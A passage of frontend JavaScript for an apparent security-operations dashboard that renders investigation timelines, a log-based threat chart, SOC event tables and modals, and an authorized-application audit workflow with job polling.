  const tl = document.getElementById("dashboard-timeline");
  if (!tl) return;
  tl.textContent = "";

  // Build timeline from recent investigations + audits
  const items = [];

  investigations.slice(0, 3).forEach(inv => {
    const finding = inv.finding || {};
    const sev    = (finding.severity || "info").toLowerCase();
    const type   = finding.activity_type || "Security Event";
    const dotCls = sev === "critical" ? "critical" : sev === "high" ? "high" : sev === "medium" ? "medium" : "info";
    const when   = _relativeTime(inv.window_start);
    items.push({ dot: dotCls, label: type + " detected", time: when, sub: "Investigation " + (inv.display_id || make_short_id(inv.id)) });
  });

  // Append mock timeline items only when no real entries exist
  if (items.length === 0) {
    MOCK_DATA.timeline.slice(0, 3).forEach(item => items.push(item));
  }

  items.forEach(item => {
    const el = document.createElement("div");
    el.className = "timeline-item";
    const dot = document.createElement("div"); dot.className = "timeline-dot " + item.dot;
    const tbody = document.createElement("div"); tbody.className = "timeline-body";
    const strong = document.createElement("strong"); strong.textContent = item.label;
    const span   = document.createElement("span");   span.textContent   = item.sub;
    tbody.appendChild(strong); tbody.appendChild(span);
    const ttime = document.createElement("div"); ttime.className = "timeline-time"; ttime.textContent = item.time;
    el.appendChild(dot); el.appendChild(tbody); el.appendChild(ttime);
    tl.appendChild(el);
  });
}

function _renderDashboardFromData(events, stats) {
  const body = document.getElementById("dashboard-alerts-body");
  if (!body) return;
  body.textContent = "";
  events.slice(0, 4).forEach(ev => {
    const row = document.createElement("div");
    row.className = "event-row";
    row.style.gridTemplateColumns = "2fr 1.5fr 1fr 1fr 1fr";
    row.addEventListener("click", () => openSOCModal(ev));
    const namecell = document.createElement("span");
    namecell.className = "event-name";
    const icon = document.createElement("span");
    icon.className = "event-icon " + severityClass(ev.severity);
    icon.textContent = ev.severity === "Safe" ? "✓" : "!";
    const nameSpan = document.createElement("span");
    nameSpan.textContent = ev.type;
    namecell.appendChild(icon);
    namecell.appendChild(nameSpan);
    const srcCell  = document.createElement("span"); srcCell.textContent  = ev.source_ip;
    const riskCell = document.createElement("span");
    riskCell.className = "risk " + severityClass(ev.severity);
    riskCell.textContent = ev.severity;
    const confCell = document.createElement("span"); confCell.textContent = ev.confidence + "%";
    const timeCell = document.createElement("span"); timeCell.textContent = ev.timestamp.slice(11, 16);
    [namecell, srcCell, riskCell, confCell, timeCell].forEach(c => row.appendChild(c));
    body.appendChild(row);
  });

  const tl = document.getElementById("dashboard-timeline");
  if (tl) {
    tl.textContent = "";
    MOCK_DATA.timeline.forEach(item => {
      const el = document.createElement("div");
      el.className = "timeline-item";
      const dot = document.createElement("div"); dot.className = "timeline-dot " + item.dot;
      const tbody = document.createElement("div"); tbody.className = "timeline-body";
      const strong = document.createElement("strong"); strong.textContent = item.label;
      const span   = document.createElement("span");   span.textContent   = item.sub;
      tbody.appendChild(strong); tbody.appendChild(span);
      const ttime = document.createElement("div"); ttime.className = "timeline-time"; ttime.textContent = item.time;
      el.appendChild(dot); el.appendChild(tbody); el.appendChild(ttime);
      tl.appendChild(el);
    });
  }
}

// ── Helpers for real-data rendering ──

function make_short_id(uuid) {
  return "INV-" + (uuid || "").slice(0, 6).toUpperCase();
}

function _relativeTime(isoStr) {
  if (!isoStr) return "—";
  try {
    const diff = Date.now() - new Date(isoStr).getTime();
    const mins = Math.floor(diff / 60000);
    if (mins < 1)  return "just now";
    if (mins < 60) return mins + " min ago";
    const hrs = Math.floor(mins / 60);
    if (hrs < 24) return hrs + " hr ago";
    return Math.floor(hrs / 24) + " days ago";
  } catch (_) { return isoStr; }
}

function _formatRawLogs(logs) {
  if (!logs || logs.length === 0) return "(no logs)";
  return logs.slice(0, 10).map(l =>
    `[${l.timestamp || "?"}] ${l.method || "?"} ${l.path || "?"} ← ${l.source_ip || "?"} → HTTP ${l.status || "?"}`
  ).join("\n");
}

const viewAllBtn = document.getElementById("dashboard-view-all");
if (viewAllBtn) viewAllBtn.addEventListener("click", () => showPage("soc-page"));

// =====================================================================
//  THREAT CHART (Dashboard canvas) — real data from /logs/list
// =====================================================================
// Module-level draw function so showPage() can call it on every navigation
async function redrawDashboardChart() {
  const canvas = document.getElementById("threatChart");
  if (!canvas) return;
  // Canvas must be visible (non-zero size) before drawing
  await new Promise(requestAnimationFrame);

  const sel    = document.getElementById("dashboard-time-select");
  const range  = sel ? sel.value : "24h";

  // ── 1. Fetch real logs from backend ─────────────────────────────────────
  let allLogs = [];
  try {
    const resp = await apiRequest("/logs/list?limit=2000");
    if (resp.ok) {
      const payload = await resp.json();
      allLogs = payload.logs || [];
    } else {
      console.warn("[ThreatChart] /logs/list returned", resp.status);
    }
  } catch (err) {
    console.warn("[ThreatChart] fetch failed:", err.message);
  }

  // ── 2. Time-range filtering ─────────────────────────────────────────────
  const now = Date.now();
  const rangeMs = { "1h": 36e5, "12h": 432e5, "24h": 864e5,
                    "3d": 2592e5, "5d": 4320e5, "7d": 6048e5, "30d": 25920e5 };
  const windowMs = rangeMs[range] || rangeMs["24h"];
  const cutoff   = now - windowMs;

  const logsInRange = allLogs.filter(log => {
    const ts = new Date(log.timestamp || log.ingested_at).getTime();
    return ts >= cutoff && ts <= now;
  });

  // ── 3. Bucket logs into time intervals ──────────────────────────────────
  const bucketCountMap = { "1h": 12, "12h": 12, "24h": 24,
                           "3d": 18, "5d": 20, "7d": 28, "30d": 30 };
  const bucketCount = bucketCountMap[range] || 24;
  const bucketSize  = windowMs / bucketCount;
  const data = new Array(bucketCount).fill(0);

  logsInRange.forEach(log => {
    const ts    = new Date(log.timestamp || log.ingested_at).getTime();
    const bIdx  = Math.min(Math.floor((ts - cutoff) / bucketSize), bucketCount - 1);
    data[bIdx]++;
  });

  // ── 4. Draw chart ───────────────────────────────────────────────────────
  const ctx = canvas.getContext("2d");
  const cssW = canvas.clientWidth  || canvas.parentElement.clientWidth  || 600;
  const cssH = canvas.clientHeight || canvas.parentElement.clientHeight || 240;

  // High-DPI rendering: backing store = CSS size × devicePixelRatio
  const dpr = window.devicePixelRatio || 1;
  canvas.width  = Math.round(cssW * dpr);
  canvas.height = Math.round(cssH * dpr);
  canvas.style.width  = cssW + "px";
  canvas.style.height = cssH + "px";
  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
  ctx.clearRect(0, 0, cssW, cssH);

  const padding = 44;
  const rootStyle = getComputedStyle(document.documentElement);
  const gridColor = rootStyle.getPropertyValue("--chart-grid").trim() || "#1e2836";
  const lineColor = rootStyle.getPropertyValue("--chart-line").trim() || "#5b9cf6";
  const mutedColor = rootStyle.getPropertyValue("--text-muted").trim() || "#6b7280";

  // ── Handle empty dataset ────────────────────────────────────────────────
  const maxValue = data.length ? Math.max(...data) : 0;
  if (maxValue === 0) {
    ctx.strokeStyle = gridColor;
    ctx.lineWidth = 1;
    for (let i = 0; i < 5; i++) {
      const y = padding + (i * (cssH - padding * 2)) / 4;
      ctx.beginPath(); ctx.moveTo(padding, y); ctx.lineTo(cssW - padding, y); ctx.stroke();
      ctx.fillStyle = mutedColor;
      ctx.font = "11px -apple-system, BlinkMacSystemFont, sans-serif";
      ctx.textAlign = "right";
      ctx.textBaseline = "middle";
      ctx.fillText("0", padding - 6, y);
    }
    ctx.save();
    ctx.translate(12, cssH / 2);
    ctx.rotate(-Math.PI / 2);
    ctx.fillStyle = mutedColor;
    ctx.font = "11px -apple-system, BlinkMacSystemFont, sans-serif";
    ctx.textAlign = "center";
    ctx.fillText("Number of Events", 0, 0);
    ctx.restore();
    ctx.fillStyle = mutedColor;
    ctx.font = "13px -apple-system, BlinkMacSystemFont, sans-serif";
    ctx.textAlign = "center";
    ctx.textBaseline = "middle";
    ctx.fillText("No events in this period", cssW / 2, cssH / 2);
    return;
  }

  // ── Nice Y-axis scale ───────────────────────────────────────────────────
  const rawStep  = maxValue / 4;
  const mag      = Math.pow(10, Math.floor(Math.log10(rawStep || 1)));
  const niceStep = Math.ceil(rawStep / mag) * mag;
  const niceMax  = niceStep * 4;

  // ── Gridlines + Y-axis labels ───────────────────────────────────────────
  ctx.strokeStyle = gridColor;
  ctx.lineWidth = 1;
  for (let i = 0; i < 5; i++) {
    const y = padding + (i * (cssH - padding * 2)) / 4;
    ctx.beginPath(); ctx.moveTo(padding, y); ctx.lineTo(cssW - padding, y); ctx.stroke();
    const tickVal = Math.round(niceMax - i * niceStep);
    ctx.fillStyle = mutedColor;
    ctx.font = "11px -apple-system, BlinkMacSystemFont, sans-serif";
    ctx.textAlign = "right";
    ctx.textBaseline = "middle";
    ctx.fillText(String(tickVal), padding - 6, y);
  }

  // Y-axis title
  ctx.save();
  ctx.translate(12, cssH / 2);
  ctx.rotate(-Math.PI / 2);
  ctx.fillStyle = mutedColor;
  ctx.font = "11px -apple-system, BlinkMacSystemFont, sans-serif";
  ctx.textAlign = "center";
  ctx.fillText("Number of Events", 0, 0);
  ctx.restore();

  // ── Data line + dots ────────────────────────────────────────────────────
  const plotW = cssW - padding * 2;
  const plotH = cssH - padding * 2;

  ctx.beginPath();
  data.forEach((value, index) => {
    const x = padding + (data.length === 1 ? plotW / 2 : index * plotW / (data.length - 1));
    const y = cssH - padding - (value / niceMax) * plotH;
    index === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
  });
  ctx.strokeStyle = lineColor;
  ctx.lineWidth = 2;
  ctx.stroke();

  data.forEach((value, index) => {
    const x = padding + (data.length === 1 ? plotW / 2 : index * plotW / (data.length - 1));
    const y = cssH - padding - (value / niceMax) * plotH;
    ctx.beginPath(); ctx.arc(x, y, 3, 0, Math.PI * 2);
    ctx.fillStyle = lineColor; ctx.fill();
  });
}

(function initDashboardChart() {
  const timeSelect = document.getElementById("dashboard-time-select");
  if (timeSelect) {
    timeSelect.addEventListener("change", () => redrawDashboardChart());
  }
  window.addEventListener("resize", () => redrawDashboardChart());
  // Initial draw: wait for DOM layout to settle so clientWidth is available
  requestAnimationFrame(() => requestAnimationFrame(() => redrawDashboardChart()));
})();

// =====================================================================
//  SOC PAGE
// =====================================================================

/**
 * Convert a raw backend investigation into the event-shape the SOC UI expects.
 */
function _invToSocEvent(inv) {
  const finding = inv.finding || {};
  const sev     = finding.severity
    ? finding.severity.charAt(0).toUpperCase() + finding.severity.slice(1).toLowerCase()
    : "Info";
  const type    = finding.activity_type || "Security Event";
  const srcIp   = (inv.logs && inv.logs[0]) ? inv.logs[0].source_ip : "—";
  const target  = (inv.logs && inv.logs[0]) ? inv.logs[0].path : "—";
  const conf    = finding.confidence != null ? Math.round(finding.confidence * 100) : 0;

  return {
    investigation_id: inv.id,
    display_id:       inv.display_id || make_short_id(inv.id),
    type,
    severity:         sev,
    source_ip:        srcIp,
    target_endpoint:  target,
    confidence:       conf,
    risk_score:       inv.trigger_score || 0,
    timestamp:        inv.window_start || "",
    status:           inv.status === "analyzed" ? "resolved" : (inv.status === "analysis_failed" ? "failed" : "open"),
    analysis:         finding.summary || "AI analysis pending.",
    actions:          finding.recommended_actions || ["Review the raw logs for context."],
    raw_log:          _formatRawLogs(inv.logs || []),
    _raw_inv:         inv,
  };
}

async function renderSOCEvents(filter) {
  currentSOCFilter = filter;
  const body    = document.getElementById("soc-events-body");
  const countEl = document.getElementById("soc-event-count");
  if (!body) return;
  body.textContent = "";

  let events = [];

  if (API_CONFIG.USE_REAL_API) {
    try {
      const resp = await apiRequest("/investigations");
      if (resp.ok) {
        const d = await resp.json();
        _apiInvestigations = d.investigations || [];
        events = _apiInvestigations.map(_invToSocEvent);
      }
    } catch (err) {
      if (err.status !== 401) {
        // Fall back to mock on error
        events = MOCK_DATA.soc_events;
      }
    }
  } else {
    events = MOCK_DATA.soc_events;
  }

  const filtered = events.filter(ev => {
    if (filter === "All") return true;
    return (ev.severity || "").toLowerCase() === filter.toLowerCase();
  });

  if (countEl) countEl.textContent = filtered.length + " Events";

  if (filtered.length === 0) {
    const empty = document.createElement("p");
    empty.style.cssText = "color:#4b5563;font-size:13px;padding:16px 8px";
    empty.textContent = API_CONFIG.USE_REAL_API
      ? "No investigations found. Ingest logs via POST /logs to trigger the SOC pipeline."
      : "No events match the current filter.";
    body.appendChild(empty);
    return;
  }

  filtered.forEach(ev => {
    const row = document.createElement("div");
    row.className = "event-row";
    row.style.gridTemplateColumns = "2fr 1fr 1.2fr 0.8fr 1.2fr 0.8fr";
    row.addEventListener("click", () => openSOCModal(ev));

    const namecell = document.createElement("span");
    namecell.className = "event-name";
    const icon = document.createElement("span");
    icon.className = "event-icon " + severityClass(ev.severity);
    icon.textContent = ev.severity === "Safe" ? "✓" : "!";
    const namespan = document.createElement("span");
    namespan.textContent = ev.type;
    namecell.appendChild(icon); namecell.appendChild(namespan);

    const sevCell  = document.createElement("span"); sevCell.appendChild(makeSeverityBadge(ev.severity));
    const srcCell  = document.createElement("span"); srcCell.textContent  = ev.source_ip;
    const confCell = document.createElement("span"); confCell.textContent = ev.confidence + "%";
    const tsCell   = document.createElement("span"); tsCell.textContent   = ev.timestamp; tsCell.style.fontSize = "12px";
    const stCell   = document.createElement("span");
    const stBadge  = document.createElement("span");
    stBadge.className = "event-status-badge " + ev.status;
    stBadge.textContent = ev.status;
    stCell.appendChild(stBadge);

    [namecell, sevCell, srcCell, confCell, tsCell, stCell].forEach(c => row.appendChild(c));
    body.appendChild(row);
  });
}

document.querySelectorAll("#soc-filters .filter-button").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelectorAll("#soc-filters .filter-button").forEach(b => b.classList.remove("active-filter"));
    btn.classList.add("active-filter");
    renderSOCEvents(btn.dataset.filter);
  });
});

// =====================================================================
//  SOC MODAL
// =====================================================================
function openSOCModal(ev) {
  const modal = document.getElementById("soc-modal");
  document.getElementById("soc-modal-title").textContent      = ev.type;
  document.getElementById("soc-modal-id").textContent         = ev.display_id;
  document.getElementById("soc-modal-time").textContent       = ev.timestamp;
  document.getElementById("soc-modal-source").textContent     = ev.source_ip;
  document.getElementById("soc-modal-target").textContent     = ev.target_endpoint;
  document.getElementById("soc-modal-confidence").textContent = (typeof ev.confidence === "number" ? ev.confidence : "—") + (typeof ev.confidence === "number" ? "%" : "");
  document.getElementById("soc-modal-risk").textContent       = ev.risk_score + " / 6 (behavioural trigger score)";
  document.getElementById("soc-modal-analysis").textContent   = ev.analysis;

  const sevEl = document.getElementById("soc-modal-severity");
  sevEl.className = "severity-badge " + severityClass(ev.severity);
  sevEl.textContent = ev.severity;

  const actionsEl = document.getElementById("soc-modal-actions");
  actionsEl.textContent = "";
  (ev.actions || []).forEach(a => {
    const li = document.createElement("li");
    li.textContent = a;
    actionsEl.appendChild(li);
  });

  document.getElementById("soc-raw-log-content").textContent = ev.raw_log || "(no raw logs available)";
  document.getElementById("soc-raw-log-panel").style.display = "none";
  document.getElementById("soc-raw-toggle").textContent = "▶ View Raw Logs";

  modal.classList.add("open");

  // Store context for Copilot — use real investigation_id if available
  const invId = ev.investigation_id || ev._raw_inv?.id || null;
  copilotContext = {
    type: "investigation",
    id:   invId,
    data: ev,
    // for mock mode fallback
    _mock: !invId || !API_CONFIG.USE_REAL_API,
  };

  if (typeof anime !== "undefined") {
    anime({ targets: "#soc-modal .modal-box", scale: [0.94, 1], opacity: [0, 1], duration: 220, easing: "easeOutQuad" });
  }
}

const rawToggle = document.getElementById("soc-raw-toggle");
if (rawToggle) {
  rawToggle.addEventListener("click", () => {
    const panel = document.getElementById("soc-raw-log-panel");
    const open  = panel.style.display !== "none";
    panel.style.display = open ? "none" : "block";
    rawToggle.textContent = open ? "▶ View Raw Logs" : "▼ Hide Raw Logs";
  });
}

const socToCopilot = document.getElementById("soc-to-copilot");
if (socToCopilot) {
  socToCopilot.addEventListener("click", () => {
    closeModal("soc-modal");
    showPage("ai-copilot-page");
    updateCopilotContext();
  });
}

// "Start Audit" button in SOC modal — closes modal and navigates to Audit page.
// The investigation context is already in copilotContext; the audit page will
// show the app selector so the analyst can choose the authorized application.
// "Validate with Advanced AI" in the SOC modal — creates a real
// validation job from the open investigation. The target is resolved
// from the registry on the backend; the client never supplies URLs.
const socToAdvancedAI = document.getElementById("soc-to-advanced-ai");
if (socToAdvancedAI) {
  socToAdvancedAI.addEventListener("click", async () => {
    closeModal("soc-modal");
    if (!API_CONFIG.USE_REAL_API || !copilotContext || copilotContext._mock || !copilotContext.id) {
      showPage("advanced-ai-page");
      return;
    }
    try {
      // Find a registry-approved Advanced AI target
      const appsRes = await apiRequest("/applications");
      let appId = null;
      if (appsRes.ok) {
        const data = await appsRes.json();
        const approved = (data.applications || []).find(a => a.advanced_ai_approved);
        if (approved) appId = approved.app_id;
      }
      if (!appId) {
        _showAuditStatus("No registered application is approved for Advanced AI.", "error");
        return;
      }
      const res = await apiRequest("/advanced-ai/jobs", {
        method: "POST",
        body: JSON.stringify({
          investigation_id: copilotContext.id,
          app_id: appId,
        }),
      });
      if (!res.ok) { _showAuditStatus(await _apiErrorMessage(res), "error"); return; }
      const created = await res.json();
      _showAuditStatus("Advanced AI job " + created.display_id + " queued", "success");
      showPage("advanced-ai-page");
    } catch (err) {
      _showAuditStatus("Advanced AI error: " + err.message, "error");
    }
  });
}

const socToAudit = document.getElementById("soc-to-audit");
if (socToAudit) {
  socToAudit.addEventListener("click", () => {
    closeModal("soc-modal");
    showPage("audit-page");
    // Briefly highlight the app selector to draw analyst attention
    const appSel = document.getElementById("audit-app-select");
    if (appSel) {
      appSel.style.outline = "2px solid var(--accent)";
      setTimeout(() => { appSel.style.outline = ""; }, 2000);
    }
  });
}

// =====================================================================
//  AUDIT PAGE — authorized-app selector
// =====================================================================

/**
 * Render a list of audit objects into the audit-history-list grid.
 * Works with both mock audits (snake_case field names) and backend
 * AuditResult dicts (may use created_at, status="complete", etc.).
 */
function _renderAuditCards(audits) {
  const grid = document.getElementById("audit-history-list");
  if (!grid) return;
  grid.textContent = "";

  if (!audits || audits.length === 0) {
    const empty = document.createElement("p");
    empty.style.cssText = "color:#4b5563;font-size:13px;padding:12px 8px";
    empty.textContent = "No audit records found.";
    grid.appendChild(empty);
    return;
  }

  audits.forEach(audit => {
    const card = document.createElement("div");
    card.className = "audit-card";
    card.addEventListener("click", () => openAuditModal(audit));

    const counts = { critical: 0, high: 0, medium: 0, safe: 0 };
    (audit.findings || []).forEach(f => {
      const sev = _normalizeFinding(f).severity || "safe";
      counts[severityClass(sev)] = (counts[severityClass(sev)] || 0) + 1;
    });
    const chips = Object.entries(counts).filter(([,v]) => v > 0)
      .map(([k, v]) => `<span class="finding-chip ${k}">${k.charAt(0).toUpperCase()+k.slice(1)}: ${v}</span>`)
      .join("");

    // Normalize field names (backend uses created_at; mock uses created)
    const displayStatus = audit.status === "complete" ? "completed" : (audit.status || "");
    const createdStr    = audit.created_at || audit.created || "";
    const dateStr       = createdStr ? createdStr.slice(0, 10) : "";
    const filesScanned  = audit.files_scanned != null ? audit.files_scanned : "—";
    const scanType      = audit.scan_type || "quick";
    const appName       = audit.app_name || audit.target || "—";
    const appWebsite    = audit.app_website || "";
    const env           = audit.environment
      ? audit.environment.charAt(0).toUpperCase() + audit.environment.slice(1)
      : "";
    const auditId       = audit.audit_id || audit.display_id || "—";

    card.innerHTML = `
      <div class="audit-card-header">
        <span class="audit-card-id"></span>
        <span class="audit-card-status ${displayStatus}"></span>
      </div>
      <div class="audit-card-app-name"></div>
      <div class="audit-card-app-website"></div>
      <div class="audit-card-meta"></div>
      <div class="audit-card-findings">${chips}</div>
    `;

    card.querySelector(".audit-card-id").textContent          = auditId;
    card.querySelector(".audit-card-status").textContent      = displayStatus;
    card.querySelector(".audit-card-app-name").textContent    = appName;
    card.querySelector(".audit-card-app-website").textContent = appWebsite;
    card.querySelector(".audit-card-meta").textContent =
      (env ? env + " · " : "") +
      scanType.charAt(0).toUpperCase() + scanType.slice(1) +
      " Scan · " + filesScanned + " files" +
      (dateStr ? " · " + dateStr : "");

    grid.appendChild(card);
  });
}

/**
 * Render the audit history panel.
 * API mode:  GET /history, filter to audit-type entries, fetch each audit.
 * Mock mode: render from MOCK_DATA.audits directly.
 */
async function renderAuditHistory() {
  if (!API_CONFIG.USE_REAL_API) {
    _renderAuditCards(MOCK_DATA.audits);
    return;
  }

  const grid = document.getElementById("audit-history-list");
  if (grid) {
    grid.textContent = "";
    const loading = document.createElement("p");
    loading.style.cssText = "color:#6b7280;font-size:13px;padding:12px 8px";
    loading.textContent = "Loading audit history…";
    grid.appendChild(loading);
  }

  try {
    const resp = await apiRequest("/history");
    if (!resp.ok) {
      const msg = await _apiErrorMessage(resp);
      _showAuditStatus("Could not load history: " + msg, "error");
      _renderAuditCards([]);
      return;
    }
    const data = await resp.json();
    // Filter to audit-type entries; fetch full audit data for each
    const auditEntries = (data.entries || []).filter(e => e.entry_type === "audit");

    if (auditEntries.length === 0) {
      _renderAuditCards([]);
      return;
    }

    // Fetch full audit details in parallel (at most 10 to avoid hammering)
    const fetches = auditEntries.slice(0, 10).map(entry =>
      apiRequest("/audit/" + entry.internal_id)
        .then(r => r.ok ? r.json() : null)
        .catch(() => null)
    );
    const audits = (await Promise.all(fetches)).filter(Boolean);
    _renderAuditCards(audits);

  } catch (err) {
    if (err.status !== 401) {
      _showAuditStatus("Could not load history: " + err.message, "error");
      _renderAuditCards([]);
    }
  }
}

// Scan type toggle
document.querySelectorAll(".scan-type-btn").forEach(btn => {
  btn.addEventListener("click", () => {
    document.querySelectorAll(".scan-type-btn").forEach(b => b.classList.remove("active-scan"));
    btn.classList.add("active-scan");
    currentScanType = btn.dataset.type;
  });
});

// =====================================================================
//  AUDIT PAGE — App selector, scope selector, endpoint selector wiring
// =====================================================================

// In mock mode only: populate the app dropdown from MOCK_DATA at startup.
// In API mode _loadAuthorizedApps() does this after login.
(function populateAppSelect() {
  if (API_CONFIG.USE_REAL_API) return; // handled by _loadAuthorizedApps()
  const sel = document.getElementById("audit-app-select");
  if (!sel) return;
  MOCK_DATA.authorized_apps.forEach(app => {
    const opt = document.createElement("option");
    opt.value = app.app_id;
    opt.textContent = app.name + " — " + app.website;
    sel.appendChild(opt);
  });
})();

// When the app selection changes, show/reset the scope row
const auditAppSelect   = document.getElementById("audit-app-select");
const auditScopeRow    = document.getElementById("audit-scope-row");
const auditScopeSelect = document.getElementById("audit-scope-select");
const auditEndpointSel = document.getElementById("audit-endpoint-select");

function updateScopeRow() {
  const appId = auditAppSelect ? auditAppSelect.value : "";
  if (!appId) {
    if (auditScopeRow) auditScopeRow.style.display = "none";
    return;
  }
  if (auditScopeRow) auditScopeRow.style.display = "flex";
  // Reset scope selector to "Entire Application" whenever app changes
  if (auditScopeSelect) auditScopeSelect.value = "all";
  // Hide endpoint selector when app changes
  if (auditEndpointSel) auditEndpointSel.style.display = "none";
}

function updateEndpointSelect() {
  if (!auditScopeSelect || !auditEndpointSel) return;
  if (auditScopeSelect.value !== "endpoint") {
    auditEndpointSel.style.display = "none";
    return;
  }
  // Populate with paths belonging ONLY to the selected application.
  // API mode:  app.allowed_scopes = [{ scope_id, name, paths }]
  // Mock mode: app.authorized_scopes = ["/path", "/path2", ...]
  const appId = auditAppSelect ? auditAppSelect.value : "";
  const app   = getApp(appId);

  let paths = [];
  if (app) {
    if (API_CONFIG.USE_REAL_API) {
      // Backend format: find the "endpoint" scope and read its paths list
      const endpointScope = (app.allowed_scopes || []).find(s => s.scope_id === "endpoint");
      paths = endpointScope ? (endpointScope.paths || []) : [];
    } else {
      // Mock format: flat array of path strings
      paths = app.authorized_scopes || [];
    }
  }

  auditEndpointSel.textContent = ""; // clear previous
  if (paths.length === 0) {
    const opt = document.createElement("option"); opt.value = ""; opt.textContent = "— No approved paths available —";
    auditEndpointSel.appendChild(opt);
  } else {
    paths.forEach(path => {
      const opt = document.createElement("option");
      opt.value = path;
      opt.textContent = path;
      auditEndpointSel.appendChild(opt);
    });
  }
  auditEndpointSel.style.display = "block";
}

if (auditAppSelect)   auditAppSelect.addEventListener("change",   updateScopeRow);
if (auditScopeSelect) auditScopeSelect.addEventListener("change", updateEndpointSelect);

// =====================================================================
//  AUDIT POLLING
//  Polls GET /audit/{audit_id} every 1.5 s until status is
//  "complete" or "failed", then calls onDone(auditData).
// =====================================================================
function _pollAudit(auditId, onDone, onError) {
  const MAX_POLLS = 120; // 120 × 1.5 s = 3 minutes max
  let polls = 0;

  async function _tick() {
    polls++;
    if (polls > MAX_POLLS) {
      onError("Audit is taking longer than expected. Refresh to check status.");
      return;
    }
    try {
      const resp = await apiRequest("/audit/" + auditId);
      if (!resp.ok) {
        const msg = await _apiErrorMessage(resp);
        onError(msg);
        return;
      }
      const data = await resp.json();
      const s = data.status;
      if (s === "complete" || s === "failed") {
        onDone(data);
      } else {
        setTimeout(_tick, 1500);
      }
    } catch (err) {
      if (err.status !== 401) onError(err.message || "Polling error");
    }
  }

  setTimeout(_tick, 1500);
}

// =====================================================================
//  START AUDIT BUTTON
//  API mode:  POST /audit/request  →  poll until complete  →  show result
//  Mock mode: animate progress bar (original behavior)
// =====================================================================
const startAuditBtn = document.getElementById("start-audit-btn");
if (startAuditBtn) {
  startAuditBtn.addEventListener("click", async () => {
    const appId    = auditAppSelect ? auditAppSelect.value : "";
    const scopeVal = auditScopeSelect ? auditScopeSelect.value : "application";
    const endpoint = (scopeVal === "endpoint" && auditEndpointSel) ? auditEndpointSel.value : null;

    if (!appId) {
      if (auditAppSelect) {
        auditAppSelect.style.borderColor = "#ef4444";
        setTimeout(() => { auditAppSelect.style.borderColor = ""; }, 1500);
      }
      return;
    }
    if (scopeVal === "endpoint" && !endpoint) {
      if (auditEndpointSel) {
        auditEndpointSel.style.borderColor = "#ef4444";
        setTimeout(() => { auditEndpointSel.style.borderColor = ""; }, 1500);
      }
      return;
    }

    const progressEl = document.getElementById("audit-scan-progress");
    const fillEl     = document.getElementById("audit-progress-fill");
    const labelEl    = document.getElementById("audit-progress-label");
    progressEl.style.display = "block";
    startAuditBtn.disabled = true;

    // ── MOCK MODE: animate progress bar only ──────────────────────────
    if (!API_CONFIG.USE_REAL_API) {
      const stages = ["Initializing…", "Crawling source files…", "Running AI analysis…", "Checking knowledge base…", "Generating report…"];
      let si = 0;
      if (typeof anime !== "undefined") {
        anime({
          targets: fillEl,
          width: ["0%", "100%"],
          duration: 4000,
          easing: "linear",
          update: anim => {
            const pct = Math.floor(anim.progress);
            const newSi = Math.floor((pct / 100) * stages.length);
            if (newSi !== si && newSi < stages.length) { si = newSi; labelEl.textContent = stages[si]; }
          },
          complete: () => {
            labelEl.textContent = "Complete!";
            setTimeout(() => {
              progressEl.style.display = "none";
              fillEl.style.width = "0%";
              startAuditBtn.disabled = false;
            }, 1200);
          }
        });
      } else {
        let pct = 0;
        const iv = setInterval(() => {
          pct += 5;
          fillEl.style.width = pct + "%";
          const newSi = Math.floor((pct / 100) * stages.length);
          if (newSi < stages.length) labelEl.textContent = stages[newSi];
          if (pct >= 100) {
            clearInterval(iv);
            labelEl.textContent = "Complete!";
            setTimeout(() => { progressEl.style.display = "none"; fillEl.style.width = "0%"; startAuditBtn.disabled = false; }, 1200);
          }
        }, 200);
      }
      return;
    }

    // ── API MODE ──────────────────────────────────────────────────────
    // Step 1: get the most recent investigation_id from the backend.
    labelEl.textContent = "Connecting…";
    fillEl.style.width  = "5%";

    let investigationId = null;
    try {
      const invResp = await apiRequest("/investigations");
      if (invResp.ok) {
        const invData = await invResp.json();
        const invs = invData.investigations || [];
        if (invs.length > 0) {
          // Most recent investigation is first (backend returns newest-first)
          investigationId = invs[0].id;
        }
      }
    } catch (_) { /* will be caught below */ }

    if (!investigationId) {
      progressEl.style.display = "none";
      fillEl.style.width = "0%";
      startAuditBtn.disabled = false;
      _showAuditStatus(
        "No investigations found. The audit engine requires at least one SOC investigation. " +
        "Ingest some logs via POST /logs to create an investigation, then retry.",
        "error"
      );
      return;
    }

    labelEl.textContent = "Submitting audit request…";
    fillEl.style.width  = "15%";

    // Step 2: POST /audit/request
    let auditId;
    try {
      const reqResp = await apiRequest("/audit/request", {
        method: "POST",
        body: JSON.stringify({
          investigation_id: investigationId,
          app_id:           appId,
          scan_type:        currentScanType,
          scope_id:         scopeVal === "all" ? "application" : scopeVal,
          endpoint:         endpoint || null,
        }),
      });

      if (!reqResp.ok) {
        const msg = await _apiErrorMessage(reqResp);
        progressEl.style.display = "none";
        fillEl.style.width = "0%";
        startAuditBtn.disabled = false;
        _showAuditStatus("Audit request failed: " + msg, "error");
        return;
      }

      const reqData = await reqResp.json();
      auditId = reqData.audit_id;
      const appNameDisplay = reqData.app_name || appId;
      labelEl.textContent = appNameDisplay + " — " + currentScanType + " scan running…";
    } catch (err) {
      progressEl.style.display = "none";
      fillEl.style.width = "0%";
      startAuditBtn.disabled = false;
      if (err.status !== 401) _showAuditStatus("Audit request failed: " + (err.message || "Unknown error"), "error");
      return;
    }

    // Step 3: animate progress bar while polling
    fillEl.style.width = "20%";
    let fakeProgress = 20;
    const creepInterval = setInterval(() => {
      // Slowly creep from 20% → 90% while the backend runs
      if (fakeProgress < 90) {
        fakeProgress += 1;
        fillEl.style.width = fakeProgress + "%";
      }
      const stageIdx = Math.min(
        Math.floor(((fakeProgress - 20) / 70) * 4),
        3
      );
      const stages = ["Crawling source files…", "Running AI analysis…", "Checking knowledge base…", "Generating report…"];
      labelEl.textContent = stages[stageIdx] || stages[3];
    }, 800);

    // Step 4: poll until complete or failed
    _pollAudit(
      auditId,
      (auditData) => {
        // Done — clean up and show result
        clearInterval(creepInterval);
        fillEl.style.width = "100%";
        labelEl.textContent = auditData.status === "complete" ? "Complete!" : "Scan failed.";

        setTimeout(() => {
          progressEl.style.display = "none";
          fillEl.style.width = "0%";
          startAuditBtn.disabled = false;

          // Inject into MOCK_DATA.audits so Advanced AI Beta can see it
          // and so renderAuditHistory() in mock mode shows it
          const normalized = _normalizeApiAudit(auditData);

          // Refresh the history panel
          renderAuditHistory();

          if (auditData.status === "complete") {
